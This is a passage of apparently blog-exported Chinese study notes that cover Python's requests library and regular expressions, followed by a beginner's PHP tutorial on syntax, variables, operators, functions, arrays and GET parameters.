对象临时移动。服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 304 - 属于重定向。自上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。 401 - 未授权。请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。 404 - 未找到。服务器找不到请求的网页。 2xx - 成功。表示服务器成功地接受了客户端请求。 3xx - 重定向。表示要完成请求，需要进一步操作。客户端浏览器必须采取更多操作来实现请求。例如，浏览器可能不得不请求服务器上的不同的页面，或通过代理服务器重复该请求。 4xx - 请求错误。这些状态代码表示请求可能出错，妨碍了服务器的处理。 5xx - 服务器错误。表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。 高级操作文件上传1234567# 导入模块&gt;&gt;&gt; import requests# 以只读的方式打开图片&gt;&gt;&gt; files &#x3D; &#123;&#39;file&#39;:open(&#39;D:&#x2F;&#x2F;1580132124441.png&#39;,&#39;rb&#39;)&#125;# 选择要上传的网站&gt;&gt;&gt; response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;,files &#x3D; files)&gt;&gt;&gt; print(response.text) 获取cookie12345678910111213# 导入模块import requests# 请求接收baidu网址response &#x3D; requests.get(&quot;https:&#x2F;&#x2F;www.baidu.com&quot;)# 打印cookiesprint(response.cookies)# 进行循环response.cookies.items项目，将key和value合并for key,value in response.cookies.items(): print(key + &#39;&#x3D;&#39; + value) &lt;RequestsCookieJar[&lt;Cookie BDORZ&#x3D;27315 for .baidu.com&#x2F;&gt;]&gt;BDORZ&#x3D;27315 会话维持1模拟登录 1234567# 导入模块import requests# 用requests中的Session()对象s&#x3D; requests.Session()s.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#x2F;set&#x2F;number&#x2F;123546465&#39;)response &#x3D; s.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#39;)print(response.text) 证书验证1234567891011import requests#如果证书不存在会报错response &#x3D; requests.get(&#39;https:&#x2F;&#x2F;www.12306.cn&#39;)print(response.status_code)# 将verify设置为False之后就会打印状态码，但还是会提示最好验证证书import requestsresponse &#x3D; requests.get(&#39;https:&#x2F;&#x2F;www.12306.cn&#39;,verify &#x3D; False)print(response.status_code) 代理设置 超时设置限制服务器应答速度1234import requestsresponse &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.taobao.com&#39;,timeout &#x3D; 1 )print(response.status_code) 认证设置 异常处理 正则表达式正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。 非python独有，re模块实现 re.matchre.match 尝试从字符串的起始位置匹配一个模式，如果不是从起始位置匹配成功的话，match()就返回none.最常规的匹配12345678910# 导入 re 模块&gt;&gt;&gt; import re# 将字符串赋值给变量content&gt;&gt;&gt; content &#x3D; &#39;Hello 123 4567 Whord_this is a regex demo&#39;# 将匹配结果赋值给result变量&gt;&gt;&gt; result &#x3D; re.match(&quot;^Hello\\s\\d&#123;3&#125;\\s\\d&#123;4&#125;\\s\\w&#123;10&#125;.*demo$&quot;,content)# 打印result变量&gt;&gt;&gt; print(result)# span表示打印的字符长度&lt;re.Match object; span&#x3D;(0, 41), match&#x3D;&#39;Hello 123 4567 Whord_this is a regex demo&#39;&gt; 泛匹配123456&gt;&gt;&gt; import re&gt;&gt;&gt; content &#x3D; &#39;Hello 123 4567 Whord_this is a regex demo&#39;# 将以Hello开头，demo$结尾中间的字符全都打印了出来&gt;&gt;&gt; result &#x3D; re.match(&quot;^Hello.*demo$&quot;,content)&gt;&gt;&gt; print(result)&lt;re.Match object; span&#x3D;(0, 41), match&#x3D;&#39;Hello 123 4567 Whord_this is a regex demo&#39;&gt; 匹配目标123456789&gt;&gt;&gt; import re&gt;&gt;&gt; content &#x3D; &#39;Hello 1234567 Whord_this is a regex demo&#39;&gt;&gt;&gt; result &#x3D; re.match(&quot;^Hello\\s(\\d+)\\sWhord.*demo$&quot;,content)&gt;&gt;&gt; print(result)&lt;re.Match object; span&#x3D;(0, 40), match&#x3D;&#39;Hello 1234567 Whord_this is a regex demo&#39;&gt;#如果正则表达式出现小括号，第一个小括号的内容就是group(1) &gt;&gt;&gt; print(result.group(1))1234567 贪婪匹配123456.*贪婪匹配，尽可能多的匹配，因为其中有一个\\d+最少要有一个数字，所以只打印了7&gt;&gt;&gt; import re&gt;&gt;&gt; content &#x3D; &#39;Hello 1234567 Whord_this is a regex demo&#39;&gt;&gt;&gt; result &#x3D; re.match(&quot;^He.*(\\d+).*demo$&quot;,content)&gt;&gt;&gt; print(result.group(1))7 非贪婪匹配123456.*?非贪婪匹配，尽可能少的匹配，看到括号里的\\d这个数字了，就停止匹配，这样.*?就只匹配了Hello和空格&gt;&gt;&gt; import re&gt;&gt;&gt; content &#x3D; &#39;Hello 1234567 Whord_this is a regex demo&#39;&gt;&gt;&gt; result &#x3D; re.match(&quot;^He.*?(\\d+).*demo$&quot;,content)&gt;&gt;&gt; print(result.group(1))1234567 匹配模式12345678&gt;&gt;&gt; import re&gt;&gt;&gt; content &#x3D; &#39;&#39;&#39;Hello 1234567 Whord_thisis a regex demo&#39;&#39;&#39;#re.S就是表示&quot;.&quot;但是这个&quot;.&quot;可以匹配换行符，如果不加re.S的话会报错因为平时的&quot;.&quot;除了换行符，可以匹配任意字符&gt;&gt;&gt; result &#x3D; re.match(&quot;^He.*?(\\d+).*?demo$&quot;,content,re.S)&gt;&gt;&gt; print(result.group(1))1234567 转义12345678910&gt;&gt;&gt; import re&gt;&gt;&gt; content &#x3D; &#39;price is $5.00&#39;&gt;&gt;&gt; result &#x3D; re.match(&quot;price is \\$5\\.00&quot;,content)&gt;&gt;&gt; print(result)&lt;re.Match object; span&#x3D;(0, 14), match&#x3D;&#39;price is $5.00&#39;&gt;&gt;&gt;&gt; result &#x3D; re.match(&quot;price is \\$5.00&quot;,content)&gt;&gt;&gt; print(result)&lt;re.Match object; span&#x3D;(0, 14), match&#x3D;&#39;price is $5.00&#39;&gt; 总结:尽量使用泛匹配、使用括号得到匹配目标、尽量使用非贪婪模式、有换行符就用re.Sre.search方法re.search 扫描整个字符串并返回第一个成功的匹配re.match 方法是要从其实位置匹配，如果匹配的不是起始位置那么就会返回None123456789这里需要使用re.search方法&gt;&gt;&gt; import re&gt;&gt;&gt; content &#x3D; &#39;most recent call last&#39;&gt;&gt;&gt; content &#x3D; &#39;most recent 1235648 call last demo&#39;&gt;&gt;&gt; result &#x3D; re.search(&quot;recent.*?(\\d+).*?last&quot;,content)&gt;&gt;&gt; print(result)&lt;re.Match object; span&#x3D;(5, 29), match&#x3D;&#39;recent 1235648 call last&#39;&gt;&gt;&gt;&gt; print(result.group(1))1235648 总结：为了匹配方便，能用search就不用matchre.findall方法搜索字符串，以列表的形式返回全部能匹配的字串 用findall方法将全部歌名打印出来 re.sub替换字符串中每一个匹配的子串后返回替换后的字符串用sub去掉a打印li中的 歌名 re.compile将正则字符串编译成正则表达式对象1将一个正则表达式串编译成正则对象，以便于复用该匹配模式 12345678910111213# 导入re模块&gt;&gt;&gt; import re# 建立一个字符串赋值给content&gt;&gt;&gt; content &#x3D; &#39;&#39;&#39;Hello 1234567 Whord_thisis a regex demo&#39;&#39;&#39;# 进行字符串编译成对象，用match方法从开头搜索&gt;&gt;&gt; pattern &#x3D; re.compile(&quot;Hello.*?demo&quot;,re.S)# 可以直接调用pattern变量，就不需要在括号里再打一遍代码&gt;&gt;&gt; result &#x3D; re.match(pattern,content)# 打印&gt;&gt;&gt; print(result)&lt;re.Match object; span&#x3D;(0, 40), match&#x3D;&#39;Hello 1234567 Whord_this\\nis a regex demo&#39;&gt;","categories":[],"tags":[]},{"title":"php","slug":"php","date":"2020-04-03T06:34:28.041Z","updated":"2020-04-03T06:34:16.000Z","comments":true,"path":"2020/04/03/php/","link":"","permalink":"https://zhanqiaozai.github.io/2020/04/03/php/","excerpt":"","text":"什么是PHP12345678910111213141516171819 超文本预处理器运行原理 运行在服务器端的，内嵌在html中的脚本语言 集成环境有哪些 wampserver xmapp phpstudy appserver php引擎(7.0) mysql(数据库 database) apache(服务) 为什么学习的时候用集成环境 学习入门访问： localhost 本机服务器名字&#x2F;php文件 127.0.0.1 你本机的ip地址&#x2F;php文件注意： 在写php代码的时候统统写在www目录下【开发工具】vim subline 【notepad++】 phpstrom webstrom dw NetBeans【php信息】 phpinfo();显示所有的php信息 他是模块化的，你需要什么，你必须给我开启那个模块 php.ini 123456789http:&#x2F;&#x2F;localhost&#x2F;http:&#x2F;&#x2F;localhost&#x2F;index.php同样效果访问某个文件夹 默认会去访问这个文件夹下面的index.php 或者也会访问 index.html 文件夹下既有index.php也有index.html在我们的环境变量里，默认会去访问index.php 如果都没有，会将目录下的文件或文件夹列举出来文件或者目录只有放在www目录下面的文件才会被我们能访问的到我们写的PHP代码，放在根目录下面的文件夹胡总和文件里面，后对名是.php 基本语法一、初识PHP脚本程序1234567891011121314151617181920211、php开始标记&lt;?php 结束标记?&gt; &lt;?php 语句.... ?&gt; 1) &lt;?php ?&gt;这之间就表示进入了PHP模式，在开始和结束标记之外的内容都会被PHP解析器忽略 2) 可以直接嵌入到html代码中，并且 可以嵌入到html代码中的任何地方，在html文档中可以嵌入任意多个PHP标记！ 3) 文件末尾的PHP代码段结束标记可以不要，在一些情况下省略掉更好！2、指令分隔符 &quot;;&quot; 分号 1)PHP语句分为两种，一种是在程序中使用结构定义语句，另一种是在程序中使用功能执行语句，前 者结尾不需要使用分号，后者必须使用分号结尾！ 2)文件末尾的结束标志 ?&gt; 就隐含了一个分号，所以PHP代码最后一行可以不加分号 3、注释 &#x2F;*多行注释*&#x2F; &#x2F;&#x2F;单行注释4、遇到空白的处理 空格、缩进、换行这些在PHP都是无关紧要的(注意：是要在英文输入法下输入)，可以将一个语句展 开成任意行，或者紧缩在一行，使用空格和空行可以增强代码的可读性，但是要合理运用，不 然会产生阅读负担 二、变量1234567891011121314151617181920212223242526272829303132333435概述： 临时(只有在我们的程序的运行过程中才存在)用于存储数据的容器1、变量的声明 声明：说白了就是事先通知！ 在使用变量之前要事先通知，事先声明一下！ 注意：在PHP中，使用变量的时候不需要声明 在PHP中变脸必须使用一个美元符号$ 后面跟着变量名来表示，赋值使用&#x3D;给一个变量赋值 例如： $变量名&#x3D;数值;2、变量的销毁 unset() &#x2F;&#x2F; 使用语法：unset($变量名) &lt;?php $handsome &#x3D; 25; unset($handsome); echo $handsome; ?&gt;3、变量的命名 1) 严格区分大小写 2) 变量名称可以是字母、数字、下划线，但不能以数字开头4、PHP中有一些关键字，其他编程语言中不能使用他们中的任何一个做为常量、函数名或类名。 但是可以在PHP中做为变量名称使用，不推荐使用关键字，5、可变变量(了解) 可变变量就是不是固定的数据，可以随时改变的 $result &#x3D; &quot;handsome&quot;; $$result &#x3D; &quot;英俊&quot;; echo $handsome;6、引用赋值 引用赋值大白话讲就是给变量起别名 $a &#x3D; 10; &#x2F;&#x2F; $b &#x3D; $a; &#x2F;&#x2F; 这种操作修改$b并不会影响另外一个值 $b &#x3D; &amp;$a; &#x2F;&#x2F; 修改任意一方都会影响 $b &#x3D; 20; echo $a;&#x2F;&#x2F; 应该可以理解为，没起别名之前$a和$b是单独的，起完别名之后$b&#x3D;&amp;$b这样他们两个就变成了要给整体 修改任意一方就会改变。 三、变量类型123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117概述： 变量类型就是指保存在该变量中的数据类型 具有相同类型的类型才能彼此操作 在强类型的语言中例如:C语言、java等，变量需要先指定类型，然后才能存储对应指定的数据 但是PHP是一种弱类型的语言，和其他语言不同的是，变量或者常量的数据类型由程序上下文决定 不需要示先声明类型 1、变量类型 使用var_dump(变量名) &#x2F;&#x2F; 可以输出变量的类型 $a &#x3D; true; var_dump($a); &#x2F;&#x2F; 返回true 1) bool(布尔型) 布尔型只有两个，true和false，真或假 以下值认为是false，其他值被认为是true ①布尔值false ②0 ③浮点数0.0 ④空白字符串和字符串0 ⑤没有成员组的数组 ⑥NULL 2) int(整形) 存储整数 3) float(浮点型) 存储小数 4) str(字符型) 使用单引号，双引号，定界符就是字符 PHP也是可以使用\\反斜杠进行转义 单引号: 在单引号中不管放什么变量都不会查找 &#x2F;&#x2F; 他不管你单引号中有什么东西，都会给你直接输出 $a &#x3D; true; $b &#x3D; &#39;hand $a some&#39;; echo $b; &#x2F;&#x2F;输出结果是: hand $a some 双引号: 在双引号中，如果你放入其他变量他就会进行查找 &#x2F;&#x2F; 输出结果会报错，因为双引号中有$a变量，PHP会进行查找， 查找之后发现变量a后面还跟着some，但是却没有$asome这个变量所以报错 $a &#x3D; true; $b &#x3D; &quot;hand$asome&quot;; echo $b; 正确语法: &#x2F;&#x2F; 这里应该使用花括号将其括起来，跟后面字符分隔开，表示花括号内的是变量 $a &#x3D; true; $b &#x3D; &quot;hand&#123;$a&#125;some&quot;; echo $b; &#x2F;&#x2F;输出结果是:hand1some,true转换成数字是1 定界符: &lt;&lt;&lt;之后提供一个标识符开始，然后是 字符串的内容 最后是同样的标识符结束 注意:标识符之后必须接，不可以用其他的任何字符。 语法: $a &#x3D; &lt;&lt;&lt;handsome 我现在是字符串吗？ handsome; var_dump($a); &#x2F;&#x2F; 如果其中也要加入其他变量的话，也需要把要加入的变量用花括号括起来 &#x2F;&#x2F; 如果不加花括号会报错，和双引号一样，而在定界符中可以包含单引号和双引号 语法: $b &#x3D; &quot;一个&quot;; $a &#x3D; &lt;&lt;&lt;handsome &#39;&#39;&#39;我现&#39;在&quot;是&#123;$b&#125;字符&quot;串&quot;&quot;吗？ handsome; &#x2F;&#x2F; 结尾的标识符必须和开头定界符后面跟的标识符相同 var_dump($a); 5) array(数组) 数组是PHP中一种重要的符合数据类型。 之前的类型只能存入一个数据，而数组可以存放多个数据，并且可以存入任何类型的数据。 跳过，后面课程讲解 6) object(对象) 跳过，后面课程讲解 7)resourse(自愿) 跳过，后面课程讲解 8)NULL NULL表示空 &#x2F;&#x2F; a变量没有赋值，也就相当于没有这个变量，返回NULL &#x2F;&#x2F; 可以将a删除，然后直接打印a的数据类型，结果一样为NULL $a; var_dump($a); 2、变量类型转换 1) 自动类型转换 布尔值: 布尔值参与运算时，true转换为整型为 1 ， false 为 0 null值参与运算时，null转换为整形0 int型和float数据参与运算时，先把int转换为float类型后在进行运算 有字符串和数字型(int或者float)参与运算时的情况 - 这些都是程序运行中不太可控的部分所以在编写代码时最好不要涉及 2) 强制类型转换 在要转换的变量之前加上括号括起来目标类型 语法： $a &#x3D; &quot;test&quot;; $b &#x3D; (int)$a; var_dump($b); &#x2F;&#x2F; 转换结果是 int(0) (int) (bool) (float) (string) (array) (object) 转变并不会改变被转换变量本身的类型 3)变量类型测试函数 语法： $a &#x3D; 10; var_dump(is_int($a)); is_bool() &#x2F;&#x2F; 检测一个变量是否为布尔值 is_int() &#x2F;&#x2F; 检测一个变量是否为整数 is_array() &#x2F;&#x2F; 检测一个变量是否为数组 等等.... 四、常量12345678910111213141516171819202122232425262728291、概念 常量也是用于临时(只有在我们的程序的运行过程中才存在)用于存储数据的容器2、定义和使用 语法： &#x2F;&#x2F; 定义常量名称的时候需要用引号将常量名称括起来，单引双引都可以 define(&#39;常量名称&#39;,常量值); &#x2F;&#x2F; 检查是否定义了某个常量 defined()函数 常量的命名与变量类似，也遵循PHP标识符的名称规则，按照惯例常量名称总是大写的3、常量变量的区别 1)常量只能用define()函数定义，不能通过赋值语句 2)常量只能用define()定义，不能通过赋值语句 3)常量可以不用理会变量范围的规则在任何地方定义和使用 4)常量一旦被定义就不能被重新定义或者取消定义 5)常量的值只能是bool，int，float，string类型4、预定义常量 预定义常量说白了就是我们的PHP内核已经帮我们定义好了的常量 其中有的预定义常量是以__两个下划线开头的，这些预定义常量我们又叫他魔术常量 代码所在的位置不同他的值也是不同的，所以他叫 魔术常量 这些特殊的常量是不区分大小写的，还是一样，建议最好常量使用大写，这样不容易混淆 而自己定义的常量是严格区分大小写的 常量名 常量值 __FILE__ 当前的文件位置 __LINE__ 当前所在行数 __FUNCTION__ 当前的函数名 __CLASS__ 当前的类名 __METHOD__ 当前对象的方法名 等等.... 五、运算符123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869运算符对一个或者多个操作数(变量或者数值)执行某种运算符的符号，也称操作符~1、算术运算符 + 两边数值相加 - 两边数值相减，也可以取反，取反的时候并不会影响到被取反变量本身的值 * 两边数值相乘 &#x2F; 两边数值相除 % 两边数值相除，并求余 ++ 自加1 -- 自减1 注意:自增自减是对变量而言的2、字符串运算符 PHP中的字符串运算符只有一个英文的句号 &quot; . &quot; 也叫连接运算符 $a &#x3D; &quot;孙悟空&quot;; $b &#x3D; &quot;在水帘洞居住&quot;; $c &#x3D; $a.$b; echo $c; &#x2F;&#x2F; 输出结果是:孙悟空在水帘洞居住3、赋值运算符 二元运算符 左边的操作数必须是变量，右边可以是表达式，也可以是一个值，一个变量等等 作用:将右边表达式的值赋给左边变量 &#x3D; +&#x3D; -&#x3D; *&#x3D; &#x2F;&#x3D; %&#x3D; .&#x3D;4、比较运算符 对操作数进行比较 如果比较结果满足于比较运算符要求，返会结果true，否则false &#x3D;&#x3D; 等于 &#x3D;&#x3D;&#x3D; 全等于(值要相等，类型也要相等) !&#x3D; 不等于 &lt;&gt; 不等于 !&#x3D;&#x3D; 不全等于 &lt;&#x3D; 小于等于 &lt; 小于 &gt;&#x3D; 大于等于 &gt; 大于5、逻辑运算符概念: 对表达式进行逻辑运算，运算出的结果是布尔类型 要求: 参与逻辑运算的表达式的值是布尔类型的值，如果不是布尔类型的值会被自动转换成布尔类型的值 逻辑与 and 或者 &amp;&amp; &#x2F;&#x2F;运算结果两边都为true结果为true，否则为false 逻辑或 or 或者 || &#x2F;&#x2F;运算结果有一边为true结果为true 逻辑异或 xor &#x2F;&#x2F;只有两边值不一样的时候结果为true，如果两边值一样就是false 逻辑非 ！ &#x2F;&#x2F;将原来的值否定，如果是true返回false，如果是false返回true6、其他运算符 1) ? : &#x2F;&#x2F;三元运算符 格式: 表达式1 ? 表达式2 : 表达式3; 如果表达式1的值为true，那么就执行表达式2，否则执行表达式3 2) &#96;&#96; 可以吧系统的命令放到里面执行！ 基本用不到，涉及到跨平台 3) @ 屏蔽表达式发生的错误 echo @$a; 4)&#x3D;&gt; 5)-&gt; 6)instanceot7、运算符优先级 谁的优先级高先算谁，如果实在不知道谁的优先级高，使用()括号将其括起来 一、流程控制12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455对PHP程序执行的过程进行控制PHP有哪些手段对程序过程进行控制一、顺序执行 顺序执行非常简单就是从上往下执行即可二、分支执行 分支执行可以根据条件是否满足来选择执行某些代码，PHP的分支执行主要通过两种语句(if,switch)来实现 1、if语句 1) 单向条件 if(表达式)语句; 格式: if($result &gt;&#x3D; $number)&#123; echo &quot;恭喜你考试成功&quot;; &#125; 2)双向条件 if&#123; 语句... &#125; else&#123; 语句... &#125; 3)多向条件 if(表达式)&#123; 语句... &#125; elseif&#123; 语句块... &#125; elseif&#123; 语句... &#125; else&#123; 语句块... &#125; 2、switch语句 格式: switch(表达式)&#123; case 值 1: 语句块1 break case 值 2: 语句块2 break ...... default: 语句块n &#125; 注意点: 1)表达式的值最好是整形或者字符串！ 2)不要忘记break语句！来跳出switch语句！每个case语句后面都加上break 3)如果某个case语句后面并没有接语句块，那么就说明这个语句块的内容是同下的 二、、循环语句1234567891011121314151617181920212223重复执行某些操作whiledo...whileforwhile循环 while(表达式)&#123; 语句... 再自加一 &#125;do...while循环 do&#123; 语句... &#125;while(表达式)for循环 for(表达式1,表达式2,表达式3)&#123; 语句... &#125; 表达式1:会放一些初始化的语句，$a&#x3D;0, 表达式2:循环次数，一般用比较操作符来判断操作次数，a&lt;&#x3D;5 表达式3:自增1，每次循环完毕都自身加1, a++ 特殊的流程控制语句1234561、break语句 退出循环 break 后面可以接上数字表示跳出几层循环，break 2 表示跳出两层循环2、continue语句 跳过本次循环3、exit()语句 结束整个程序的执行 三、函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859使用函数的优点 提高软件的可维护性 提高软件的开发效率 提高软件的重用性 函数的创建和调用 &#x2F;&#x2F;创建一个fun函数，函数内部输出内容Hello function fun()&#123; echo &#39;Hello&#39;; &#125; &#x2F;&#x2F;调用函数，函数名后面需要加括号 fun(); 一、自定义函数 1、函数的定义 function 函数名([参数1，参数2,....])&#123; return 表达式;&#x2F;&#x2F;可以从函数中返回一个值，也可以不返回 &#125; 2、函数的调用 不管是自己定义的函数还是系统提供的函数，如果函数不被调用就不会执行！ 调用：函数被调用后开始执行函数体中代码，执行的过程是相对独立的，执行完毕返回调用的位置继 续向下执行 3、函数的参数 形式参数由零个、一个或者多个变量组成。 实际参数由零个、一个或者多个参数组成，每个参数是一个表达式，用逗号分隔 4、函数的返回值 函数的返回值是是将函数执行后的结果返回给调用者 默认如果不写返回则函数的返回值为NULL 二、变量的范围 1、局部变量 function fun()&#123; echo $i; $a&#x3D;1; &#x2F;&#x2F;局部变量 &#125; 局部变量也称为内部变量，局部变量实在函数内定义的，作用域仅限于函数的内部。 2、全局变量 $i&#x3D;10; &#x2F;&#x2F;全局变量 function fun()&#123; global $i; &#x2F;&#x2F;声明$i为全局变量，然后在这个函数内部就可以使用$i echo $i; $a&#x3D;1; &#125; fun(); 全局变量也被称为外部变量，在函数的外部定义的，作用域从定义处到程序文件的末尾 在PHP函数中无法直接使用全局变量，如需使用必须使用global声明变量 3、静态变量 function fun()&#123; static $a&#x3D;1; &#x2F;&#x2F;静态变量$a,初始化静态变量，仅在第一次调用的时候执行 echo ++$a; &#x2F;&#x2F;当第二次执行这个函数的时候$a这个变量依然存在并且里面的值也依然 存在 &#125; fun(); echo &#39;&lt;br &#x2F;&gt;&#39;; fun(); 静态变量的是值在函数内部定义的时候static关键字来定义变量特点：函数执行完毕之后变量 不会立即消失，再次调用函数的时候，静态变量保存的值依然存在，并且仅在第一次执行 函数的时候会初始化值 参数传递1234567891011121314151617181920212223242526272829303132333435363738394041一、函数的传递 1、案值传递参数 默认的，我们在传递参数的时候默认使用的就是这个方式！ 对形式参数的操作，根本不会影响到实际参数的值两者相当于没有联系 function fun($a)&#123; echo ++$a; &#125; $i &#x3D; 10; fun($i); &#x2F;&#x2F; 打印结果 11 echo &#39;&lt;br &#x2F;&gt;&#39;,$i; &#x2F;&#x2F; 打印结果10 2、按引用传递参数 按引用传递参数，相当于形式参数和实际参数是同一个值，只是名字不一样，相当于起了个别名 对于形式参数的操作会直接影响到实际参数 function fun(&amp;$a)&#123; echo ++$a; &#125; $i &#x3D; 10; fun($i); &#x2F;&#x2F; 打印结果11 echo &#39;&lt;br &#x2F;&gt;&#39;, $i; &#x2F;&#x2F; 打印结果11 3、函数的默认参数 可以给形式参数设置默认值，设置发方法直接赋值即可 给形式参数加默认值的时候是从右往左加，右边的必须有，才能给左边的加， 右边必须加的值就是默认值 &#x2F;&#x2F; $b&#x3D;10就是默认值 function fun($a,$b&#x3D;10)&#123; echo $a+$b; &#125; fun(20); 4、可变长度参数列表 PHP提供了三个函数，可以直接使用 func_get_args(); func_get_arg(); func_num_args(); 这三个函数可以使用在自定义函数内部，能够给我们返回一些关于参数的信息 function test()&#123; &#x2F;&#x2F; var_dump(func_get_args()); &#x2F;&#x2F;做一些其他操作 &#x2F;&#x2F; var_dump(func_get_arg(1)); &#x2F;&#x2F;调用这个函数的时候可以传入一个值表示获取第 几个实际参数(从0开始)，感觉类似索引 var_dump(func_num_args()); &#x2F;&#x2F;返回传入所在自定义函数的参数的个数， 类似于 数据库的，length &#125; test(2313,135165,165165,&#39;uiashdinsauiod&#39;); &#x2F;&#x2F; 自定义函数参数个数 四、可变函数123456就是把一个函数赋值给变量function test()&#123; echo &#39;我是TEST函数&#39;;&#125;$a &#x3D; &#39;test&#39;; &#x2F;&#x2F; $a &#x3D; test();echo $a(); &#x2F;&#x2F; echo a; &#x2F;&#x2F;这种也能输出，但不知道后续有什么问题 五、递归函数12345678910111213141516递归函数即在函数内部自己调用自己的函数.递归函数: 1)函数在被调用的执行过程中会在内存里面分配空间用于存储临时数据，函数在执行过程中默认之间 没有任何联系，除了(静态变量，接引用传，全局变量),里面的变量默认都是局部变量 2)递归函数，在函数的内部需要有适时结束函数运行的条件在使用递归的时候避免死循环function fun($i)&#123; echo $i.&#39;&amp;nbsp;&#39;; if($i&gt;0)&#123; fun($i-1); &#x2F;&#x2F; 自己内部调用自己，即 递归函数 &#125;else&#123; echo &#39;&lt;- - -&gt;&#39;; &#125; echo $i.&#39;&amp;nbsp;&#39;; &#125; &#x2F;&#x2F; fun(3);&#x2F;&#x2F;返回结果是 3 2 1 0 &lt;- - -&gt;0 1 2 3 六、内置函数12PHP提供给我们许多现成的函数或者结构，我们可以在实际的开发中直接使用使用函数使用来完成功能的，说白了，有这样的需求，才会找对应的函数！ 理解数组和创建数组123456789思路 数组概论: 可以把这些单个数据都联合起来(打包、捆绑)起来，作为一个整体 这个数据类型就是 数组 他是一种 复合数据类型 数组类型： 索引值:将相当于给里面的每一个数据起个名字 名字如果取得是整型：那么这个数组就是索引数组 如果名字是字符串类：那么这个数组就是 关联数组 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263数组创建:PHP中创建数组非常灵活，与其他许多编程语言不同的是PHP不需要在创建数组时，指定数组的大小(指定数组里面可以放几个数据)，甚至不需要在使用数组之前声明，也可以在同一个数组中存放任何了型的数据。 · 直接为元素赋值即可创建数组 · 使用array()语言结构创建数组1、直接为数组元素赋值创建数组 $变量名[索引值]&#x3D;数据内容; 索引值可以是整数也可以是字符串，也可以不写(默认为索引数组) 如果省略索引值不写那么默认索引值就是整数，并且从0开始，依次向上 &#x2F;&#x2F; $student[索引值]&#x3D;数据值; 不加索引值从0开始依次向上 $student[0]&#x3D;10; $student[]&#x3D;10; &#x2F;&#x2F; 0 $student[1]&#x3D;&#39;孙悟空&#39;; $student[]&#x3D;&#39;孙悟空&#39;; &#x2F;&#x2F; 1 $student[2]&#x3D;true; $student[]&#x3D;true; &#x2F;&#x2F; 2 $student[3]&#x3D;60.5; $student[]&#x3D;60.5; &#x2F;&#x2F; 3 &#x2F;&#x2F; 使用echo并不能输出数组，而是需要使用print_r()函数来输出打印数组 &#x2F;&#x2F;echo $student; print_r($student); &#x2F;&#x2F; 使用var_dump也可以输出，并且打印数据类型 &#x2F;&#x2F;var_dump($student); 2、使用array()结构创建数组 $变量名&#x3D;array(key1&#x3D;&gt;value1......); 创建数组 $student&#x3D;array( | &#x2F;&#x2F;可以不写索引值直接输出 &#39;sum&#39;&#x3D;&gt;10, | $student&#x3D;array(10,&#39;孙悟空&#39;,true,60.5) &#39;name&#39;&#x3D;&gt;&#39;孙悟空&#39;, | &#39;sex&#39;&#x3D;&gt;true, | &#39;grade&#39;&#x3D;&gt;60.5 | ); | &#x2F;&#x2F;print_r($student);| var_dump($student); | 使用数组里面的具体数据数组变量名称[索引值]$student&#x3D;array(&#39;sum&#39;&#x3D;&gt;10,&#39;name&#39;&#x3D;&gt;&#39;孙悟空&#39;,&#39;sex&#39;&#x3D;&gt;true,&#39;grade&#39;&#x3D;&gt;60.5);echo $student[&#39;name&#39;]; &#x2F;&#x2F; 数组[索引值]，输出结果&#39;孙悟空&#39;数组中还可以放数组二维数组$student&#x3D;array( array(1,&#39;孙悟空&#39;,true,60.5), array(2,&#39;唐玄奘&#39;,true,100), array(3,&#39;沙和尚&#39;,true,80.5), array(4,&#39;猪八戒&#39;,true,0),);print_r($student);二维数组如果需要调用其中的一个值$student&#x3D;array( array(1,&#39;孙悟空&#39;,true,60.5), array(2,&#39;唐玄奘&#39;,true,100), array(3,&#39;沙和尚&#39;,true,80.5), array(4,&#39;猪八戒&#39;,true,0),);&#x2F;&#x2F; 0表示从第0个开始也就是从孙悟空那个数组开始，&#x2F;&#x2F; 3表示第0个数组里面索引是3的值echo $student[0][3]; 1234567891011121314151617181920212223242526272829数组的遍历 遍历:每个都经历一遍 1) for循环 用的少，因为有缺陷，不能用于关联数组进行遍历 2) foreach语句来实现遍历数组的目的，比较常用，专门用来遍历数组的 foreach(数组变量名 as 变量1)&#123; 每次循环执行的语句 变量1代表当前正在经历的数据 &#125;不管是关联数组还是一维数组二维数组，都可以输出 实例: $arr1 &#x3D; array( &#39;name&#39;&#x3D;&gt;&#39;孙悟空&#39;, &#39;num&#39;&#x3D;&gt;10 ); foreach($arr1 as $value)&#123; echo $value; &#125; 如果你想要的知道索引值如果想要知道索引值必须加&#x3D;&gt;符号，前面的变量是索引值，后面的变量是执行的数据 $arr1 &#x3D; array( &#39;name&#39;&#x3D;&gt;&#39;孙悟空&#39;, &#39;num&#39;&#x3D;&gt;10 ); foreach($arr1 as $w&#x3D;&gt;$value)&#123; echo $w,$value.&#39;&lt;br &#x2F;&gt;&#39;; &#125; 123456789101112131415161718192021222324252627282930313233343536预定义超全局数组变量 已经定义好了(存在)的变量(存放的数据的类型是数组 ) 超全局:超级全局变量，作用域(有效区域)全局的，并不需要global来定义 传递数据(提供数据)给服务器端主要的两种方式 1.get方式 比如: &#x2F;&#x2F;其中&amp;表示后面可以追加多个值 ?id&#x3D;10&amp;name&#x3D;SunWuKong http:&#x2F;&#x2F;localhost&#x2F;demo2&#x2F;1.php?参数名&#x3D;参数值 在服务器端(请求的PHP文件这边)可以通过$_GET来获取到 $_GET就是在服务端的参数名字，而在URL中的索引值对应的数据就是参数值 在服务端使用$_GET: var_dump($_GET); $_GET优缺点 优点: 